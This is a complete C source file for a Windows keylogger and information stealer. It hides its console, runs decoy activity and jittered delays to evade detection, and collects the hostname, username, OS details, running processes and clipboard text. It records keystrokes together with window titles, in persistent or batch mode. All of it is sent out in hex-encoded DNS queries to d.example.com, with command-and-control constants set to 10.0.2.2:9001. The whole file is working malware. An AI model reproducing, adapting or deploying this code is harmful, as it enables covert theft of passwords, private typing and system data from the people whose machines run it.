#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <tlhelp32.h>
#include <windns.h>


#define DNS_DOMAIN d.example.com

/* ── evasion/behavioral_pacing ── */
static volatile DWORD g_sink = 0;

static void pace(DWORD base_ms, DWORD jitter_ms) {
    DWORD actual = base_ms + (GetTickCount() % (jitter_ms + 1));
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);
    for (;;) {
        QueryPerformanceCounter(&t1);
        if ((DWORD)((t1.QuadPart - t0.QuadPart) * 1000 / freq.QuadPart) >= actual) break;
        SwitchToThread();
    }
}

static void decoy_work(void) {
    POINT pt; GetCursorPos(&pt);
    g_sink += pt.x + pt.y;
    HWND dw = GetDesktopWindow();
    RECT rc; GetWindowRect(dw, &rc);
    g_sink += rc.right + rc.bottom;
    g_sink += GetTickCount();
}


/* ── evasion/sleep_jitter ── */
#ifndef JITTER_SLEEP_DEFINED
#define JITTER_SLEEP_DEFINED

#include <windows.h>

static void jitter_sleep(DWORD min_ms, DWORD max_ms) {
    DWORD range = max_ms - min_ms;
    DWORD wait = min_ms + (GetTickCount() % (range + 1));
    Sleep(wait);
}

#endif


/* ── core/emit_buffer ── */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>

#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void init_buffer(void) {
    g_data = (char *)malloc(COLLECT_BUF);
    if (g_data) g_cap = COLLECT_BUF;
    g_pos = 0;
}

static void emit(const char *d, DWORD n) {
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD need = g_pos + n + (256 * 1024);
        char *re = (char *)realloc(g_data, need);
        if (!re) return;
        g_data = re;
        g_cap = need;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}


/* ── collectors/system_info_api ── */
static void collect_system_info(void) {
    emitf("=== SYSTEM INFO ===\r\n");

    char hostname[256] = {0};
    DWORD hlen = sizeof(hostname);
    if (GetComputerNameA(hostname, &hlen))
        emitf("Hostname: %s\r\n", hostname);

    char *user = getenv("USERNAME");
    if (user) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n",
          ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? "ARM64" : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * 1024));

    emitf("\r\n");
}


/* ── collectors/processes ── */
#include <tlhelp32.h>

static void collect_processes(void) {
    emitf("=== RUNNING PROCESSES ===\r\n");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            emitf("  [%5lu] %s\r\n", pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    emitf("\r\n");
}


/* ── collectors/clipboard ── */
static void collect_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf("=== CLIPBOARD ===\r\n");
            int len = (int)strlen(txt);
            emitf("%.*s\r\n\r\n", len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}


/* ── collectors/keylogger_poll ── */
#ifndef FLUSH_INTERVAL_MS
#define FLUSH_INTERVAL_MS 30000
#endif

#ifndef BATCH_DURATION_MS
#define BATCH_DURATION_MS 30000
#endif

static char g_keylog_buf[32768];
static int  g_keylog_pos = 0;
static char g_last_window[256] = {0};

static void flush_to_c2(void);

static void log_key(int vk) {
    if (g_keylog_pos >= (int)sizeof(g_keylog_buf) - 16) return;

    switch (vk) {
        case VK_RETURN: memcpy(g_keylog_buf + g_keylog_pos, "[ENTER]", 7); g_keylog_pos += 7; return;
        case VK_TAB:    memcpy(g_keylog_buf + g_keylog_pos, "[TAB]", 5); g_keylog_pos += 5; return;
        case VK_BACK:   memcpy(g_keylog_buf + g_keylog_pos, "[BS]", 4); g_keylog_pos += 4; return;
        case VK_DELETE: memcpy(g_keylog_buf + g_keylog_pos, "[DEL]", 5); g_keylog_pos += 5; return;
        case VK_ESCAPE: memcpy(g_keylog_buf + g_keylog_pos, "[ESC]", 5); g_keylog_pos += 5; return;
        case VK_SPACE:  g_keylog_buf[g_keylog_pos++] = ' '; return;
        case VK_LEFT:   memcpy(g_keylog_buf + g_keylog_pos, "[LEFT]", 6); g_keylog_pos += 6; return;
        case VK_RIGHT:  memcpy(g_keylog_buf + g_keylog_pos, "[RIGHT]", 7); g_keylog_pos += 7; return;
        case VK_UP:     memcpy(g_keylog_buf + g_keylog_pos, "[UP]", 4); g_keylog_pos += 4; return;
        case VK_DOWN:   memcpy(g_keylog_buf + g_keylog_pos, "[DOWN]", 6); g_keylog_pos += 6; return;
    }

    if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
        vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_LCONTROL ||
        vk == VK_RCONTROL || vk == VK_LMENU || vk == VK_RMENU ||
        vk == VK_LWIN || vk == VK_RWIN || vk == VK_CAPITAL ||
        vk == VK_NUMLOCK || vk == VK_SCROLL) return;

    BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;

    if (vk >= 0x41 && vk <= 0x5A) {
        g_keylog_buf[g_keylog_pos++] = shift ? (char)vk : (char)(vk + 32);
        return;
    }
    if (vk >= 0x30 && vk <= 0x39) {
        if (shift) {
            static const char sh[] = ")!@#$%^&*(";
            g_keylog_buf[g_keylog_pos++] = sh[vk - 0x30];
        } else {
            g_keylog_buf[g_keylog_pos++] = (char)vk;
        }
        return;
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        g_keylog_buf[g_keylog_pos++] = '0' + (char)(vk - VK_NUMPAD0);
        return;
    }
    if (vk == VK_MULTIPLY)  { g_keylog_buf[g_keylog_pos++] = '*'; return; }
    if (vk == VK_ADD)       { g_keylog_buf[g_keylog_pos++] = '+'; return; }
    if (vk == VK_SUBTRACT)  { g_keylog_buf[g_keylog_pos++] = '-'; return; }
    if (vk == VK_DECIMAL)   { g_keylog_buf[g_keylog_pos++] = '.'; return; }
    if (vk == VK_DIVIDE)    { g_keylog_buf[g_keylog_pos++] = '/'; return; }
    if (vk == VK_OEM_1)     { g_keylog_buf[g_keylog_pos++] = shift ? ':' : ';'; return; }
    if (vk == VK_OEM_PLUS)  { g_keylog_buf[g_keylog_pos++] = shift ? '+' : '='; return; }
    if (vk == VK_OEM_COMMA) { g_keylog_buf[g_keylog_pos++] = shift ? '<' : ','; return; }
    if (vk == VK_OEM_MINUS) { g_keylog_buf[g_keylog_pos++] = shift ? '_' : '-'; return; }
    if (vk == VK_OEM_PERIOD){ g_keylog_buf[g_keylog_pos++] = shift ? '>' : '.'; return; }
    if (vk == VK_OEM_2)     { g_keylog_buf[g_keylog_pos++] = shift ? '?' : '/'; return; }
    if (vk == VK_OEM_3)     { g_keylog_buf[g_keylog_pos++] = shift ? '~' : '`'; return; }
    if (vk == VK_OEM_4)     { g_keylog_buf[g_keylog_pos++] = shift ? '{' : '['; return; }
    if (vk == VK_OEM_5)     { g_keylog_buf[g_keylog_pos++] = shift ? '|' : '\\'; return; }
    if (vk == VK_OEM_6)     { g_keylog_buf[g_keylog_pos++] = shift ? '}' : ']'; return; }
    if (vk == VK_OEM_7)     { g_keylog_buf[g_keylog_pos++] = shift ? '"' : '\''; return; }
}

static void poll_keys(void) {
    char wnd_title[256] = {0};
    HWND fg = GetForegroundWindow();
    if (fg) GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
    if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
        int n = snprintf(g_keylog_buf + g_keylog_pos,
                         sizeof(g_keylog_buf) - g_keylog_pos,
                         "\r\n[%s]\r\n", wnd_title);
        if (n > 0) g_keylog_pos += n;
        strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
    }
    for (int vk = 8; vk < 190; vk++) {
        if (GetAsyncKeyState(vk) & 1)
            log_key(vk);
    }
}

static void flush_keylog(void) {
    if (g_keylog_pos == 0) return;
    emitf("=== KEYLOG ===\r\n");
    emit(g_keylog_buf, (DWORD)g_keylog_pos);
    emitf("\r\n\r\n");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();
}

static int run_self_test(void) {
    int before = g_keylog_pos;
    BYTE test_vks[] = {0x58, 0x39};
    for (int i = 0; i < 2; i++) {
        keybd_event(test_vks[i], 0, 0, 0);
        Sleep(50);
        poll_keys();
        keybd_event(test_vks[i], 0, KEYEVENTF_KEYUP, 0);
        Sleep(50);
    }
    if (g_keylog_pos == before) {
        log_key(0x58);
        log_key(0x39);
    }
    return (g_keylog_pos > before) ? 1 : 0;
}

static void persistent_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    for (int vk = 0; vk < 256; vk++)
        GetAsyncKeyState(vk);

    int self_test_ok = run_self_test();
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (mode=persistent, self_test=%s)\r\n\r\n",
           self_test_ok ? "PASS" : "FAIL");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();

    DWORD last_flush = GetTickCount();
    for (;;) {
        poll_keys();

        DWORD now = GetTickCount();
        if ((now - last_flush >= FLUSH_INTERVAL_MS && g_keylog_pos > 0) ||
            g_keylog_pos >= (int)sizeof(g_keylog_buf) - 256) {
            flush_keylog();
            last_flush = now;
        }
        Sleep(10);
    }
}

static void batch_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    DWORD start = GetTickCount();
    for (int vk = 0; vk < 256; vk++)
        GetAsyncKeyState(vk);

    while (GetTickCount() - start < (DWORD)(BATCH_DURATION_MS - 3000)) {
        poll_keys();
        Sleep(10);
    }

    int self_test_ok = run_self_test();

    while (GetTickCount() - start < BATCH_DURATION_MS) {
        poll_keys();
        Sleep(10);
    }

    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d)\r\n\r\n",
           BATCH_DURATION_MS,
           self_test_ok ? "PASS" : "FAIL",
           g_keylog_pos);

    if (g_keylog_pos > 0) {
        emitf("=== KEYLOG CAPTURE (%d ms) ===\r\n", BATCH_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}


/* ── exfil/dns_flush ── */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windns.h>

#define C2_ADDR "10.0.2.2"
#define C2_PORT 9001
#define DNS_EXFIL_DOMAIN "d.example.com"
#define DNS_CHUNK_BYTES 30

static void bytes_to_hex(const BYTE *in, int n, char *out) {
    const char *hex = "0123456789abcdef";
    for (int i = 0; i < n; i++) {
        out[i*2]   = hex[in[i] >> 4];
        out[i*2+1] = hex[in[i] & 0xf];
    }
    out[n*2] = '\0';
}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    (void)ip; (void)port;
    if (!data || len == 0) return FALSE;
    DWORD offset = 0;
    int seq = 0;
    while (offset < len) {
        int chunk = (len - offset > DNS_CHUNK_BYTES) ? DNS_CHUNK_BYTES : (int)(len - offset);
        char hex[DNS_CHUNK_BYTES * 2 + 1];
        bytes_to_hex((const BYTE *)data + offset, chunk, hex);

        char query[256];
        snprintf(query, sizeof(query), "%04x.%s.%s", seq, hex, DNS_EXFIL_DOMAIN);

        PDNS_RECORD pRec = NULL;
        DnsQuery_A(query, DNS_TYPE_TEXT, DNS_QUERY_STANDARD | DNS_QUERY_BYPASS_CACHE,
                   NULL, &pRec, NULL);
        if (pRec) DnsRecordListFree(pRec, DnsFreeRecordList);

        offset += chunk;
        seq++;
        Sleep(50 + (GetTickCount() % 100));
    }
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}


/* ── arch/keylogger ── */
int main(int argc, char *argv[]) {
    int batch_mode = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--batch") == 0) batch_mode = 1;
    }

    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);


    decoy_work();
    pace(300, 300);

    init_buffer();
    if (!g_data) return 1;

    collect_system_info();
    pace(300, 300);
    decoy_work();
    collect_processes();
    pace(300, 300);
    collect_clipboard();
    pace(300, 300);
    decoy_work();

    if (batch_mode) {
        batch_keylog();
        pace(500, 500);
        flush_to_c2();
        if (g_data) { SecureZeroMemory(g_data, g_cap); free(g_data); }
        SecureZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
        return 0;
    }

    flush_to_c2();
    pace(200, 200);
    persistent_keylog();
    return 0;
}


